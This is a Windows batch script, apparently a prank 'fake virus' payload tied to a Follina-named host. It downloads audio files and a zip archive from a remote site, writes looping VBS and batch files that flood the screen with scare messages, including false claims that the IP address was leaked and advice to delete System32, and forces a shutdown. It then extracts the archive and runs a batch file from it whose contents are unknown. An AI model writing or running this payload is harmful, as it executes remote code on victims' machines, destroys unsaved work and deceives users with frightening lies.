mkdir fakeviruscontent

cd fakeviruscontent

set FILES_HOST=https://susussamongus.github.io/follina/content

curl -o "rick.mp3" %FILES_HOST%/rick.mp3

curl -o "amogus.mp3" %FILES_HOST%/amogus.mp3

curl -o "dobrota_clean.zip" %FILES_HOST%/dobrota_clean.zip

echo x=msgbox("Hacked", 16, "")>alert.vbs

echo x=msgbox("Finding IP address...", 16, "")>findip.vbs

echo x=msgbox("amogus", 48, "sus")>amogus.vbs

echo x=msgbox("Go here to learn how to remove the virus: https://www.youtube.com/watch?v=dQw4w9WgXcQ", 48, "RICKROLLED LOL")>link.vbs

(
echo Dim objShell
echo Set objShell = WScript.CreateObject^("WScript.Shell"^)
echo Dim aPlayer
echo Set aPlayer = CreateObject^("WMPlayer.OCX"^)
echo aPlayer.URL = "amogus.mp3"
echo aPlayer.controls.play
echo While aPlayer.playState ^<^> 1
echo   wScript.Sleep 5000
echo   objShell.Run^("sussy.bat"^)
echo Wend
echo aPlayer.close
)>mogus.vbs

(
echo Dim objShell
echo Set objShell = WScript.CreateObject^("WScript.Shell"^)
echo Dim rPlayer
echo Set rPlayer = CreateObject^("WMPlayer.OCX"^)
echo rPlayer.URL = "rick.mp3"
echo rPlayer.controls.play
echo While rPlayer.playState ^<^> 1
echo   wScript.Sleep 5000
echo   objShell.Run^("lyrics.bat"^)
echo Wend
echo rPlayer.close
)>rick.vbs

(
echo @echo off
echo color 0a
echo start /b cscript amogus.vbs
echo :a
echo echo SUS
echo echo AMONGUS 
echo echo SUSSY BAKA
echo echo IMPOSTER
echo goto a
)>sussy.bat

(echo @echo off
echo color 0a
echo :a
echo echo HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED
echo echo HELLO YOUR COMPUTER HAS VIRUS
echo echo MICROSOFT HAS DETECTED VIRUS ON YOUR PC. CLICK TO REMOVE VIRUS
echo echo TO REMOVE VIRUS DELETE SYSTEM32
echo goto a
)>messages.bat

(echo @echo off
echo color 0a
echo ipconfig
echo YOUR IP ADDRESS HAS BEEN UPLOADED TO THE DARK WEB
echo pause
)>ipaddress.bat

(echo @echo off
echo color 0a
echo start /b cscript link.vbs
echo :a
echo echo Never gonna give you up
echo echo Never gonna let you down
echo echo Never gonna run around and desert you
echo echo Never gonna make you cry
echo echo Never gonna say goodbye
echo echo Never gonna tell a lie and hurt you
echo goto a
)>lyrics.bat

cscript alert.vbs

start ipaddress.bat

cscript findip.vbs

start sussy.bat

for /L %%i in (1 1 20)do (
start /b cscript alert.vbs
)

cscript mogus.vbs

start messages.bat

start lyrics.bat

cscript rick.vbs

mkdir dobrota_clean

cd dobrota_clean

shutdown /s /t 200 /c "YOUR COMPUTER HAS BEEN HACKED" /f /d p:5:15

tar -xf ../dobrota_clean.zip

start /b start_dobrota.bat

pause
